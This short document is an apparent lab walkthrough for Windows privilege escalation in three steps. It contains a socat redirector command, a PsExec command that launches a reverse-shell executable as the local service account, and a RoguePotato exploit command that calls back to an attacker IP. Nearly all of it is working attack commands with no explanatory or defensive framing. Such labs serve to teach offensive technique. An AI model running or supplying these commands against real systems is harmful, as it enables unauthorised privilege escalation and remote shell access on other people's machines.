
1. **Set up Socat Redirector on Kali:**
   ```plaintext
   sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
   ```

2. **Simulate Service Account Shell:**
   - Log into RDP as admin.
   - Start a command prompt:
     ```plaintext
     C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
     ```

3. **Run RoguePotato Exploit:**
   ```plaintext
   C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
   ```
